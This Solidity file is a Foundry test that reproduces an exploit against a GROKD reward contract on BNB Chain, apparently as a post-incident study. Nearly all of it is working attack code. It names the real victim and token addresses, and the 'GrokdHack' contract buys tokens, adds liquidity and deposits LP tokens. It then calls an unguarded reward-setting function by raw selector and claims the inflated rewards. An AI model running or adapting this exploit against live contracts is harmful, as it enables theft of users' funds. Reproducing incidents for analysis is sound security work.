// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IPancakeV2.sol";
import "@interface/IWBNB.sol";

import "./IGROKD.sol";

WBNB constant BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

IPancakeRouterV2 constant pancakeRouterV2 = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);

IGROKD constant GROKD = IGROKD(
    payable(0xa4133feD73Ea3361f2f928f98313b1e1e5049612)
);

IPancakePairV2 constant GROKDPair = IPancakePairV2(
    0x8AF65d9114DfcCd050e7352D77eeC98f40c42CFD
);

interface Victim {
    function deposit(address token, uint256 amount) external;

    function lastRewardBlock() external returns (uint256);

    function reward() external;
}

Victim constant victim = Victim(0x31d3231cDa62C0b7989b488cA747245676a32D81);

contract GrokdHack {
    address admin;

    constructor() payable {
        admin = msg.sender;
    }

    function fuckyou() public payable {
        address[] memory path = new address[](2);
        path[0] = address(BNB);
        path[1] = address(GROKD);
        pancakeRouterV2.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 0.1 ether
        }(0, path, address(this), block.timestamp + 1);

        uint256 tokenBal = GROKD.balanceOf(address(this));
        GROKD.approve(address(pancakeRouterV2), tokenBal);

        pancakeRouterV2.addLiquidityETH{value: 0.1 ether}(
            address(GROKD), // token
            tokenBal, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            address(this),
            block.timestamp + 1
        );

        GROKDPair.approve(address(victim), 1 ether);
        victim.deposit(address(0), 1 ether);

        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "send BNB failed");
    }

    function fucksher() public {
        bytes memory data = abi.encodeWithSelector(
            hex"d2beb00a",
            0,
            37565180,
            37997180,
            969437458174368938037660232
        );
        (bool ok, ) = address(victim).call(data);
        require(ok, "excute d2beb00a failed");

        victim.reward();
    }

    receive() external payable {}
}

contract GrokdTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 37622449 - 1);
        deal(address(this), 0.2 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "victim's GROKD Balance",
            GROKD.balanceOf(address(victim)),
            18
        );

        (uint112 reserve0, uint112 reserve1, ) = GROKDPair.getReserves();

        emit log_named_decimal_uint("GROKD pair GROKD", reserve0, 18);
        emit log_named_decimal_uint("GROKD pair BNB", reserve1, 18);

        GrokdHack hacker = new GrokdHack();

        vm.roll(37622464 - 1);
        hacker.fuckyou{value: 0.2 ether}();

        vm.roll(37622478 - 1);
        hacker.fucksher();

        emit log_named_decimal_uint(
            "GROKD Balance",
            GROKD.balanceOf(address(hacker)),
            18
        );
    }

    receive() external payable {}
}
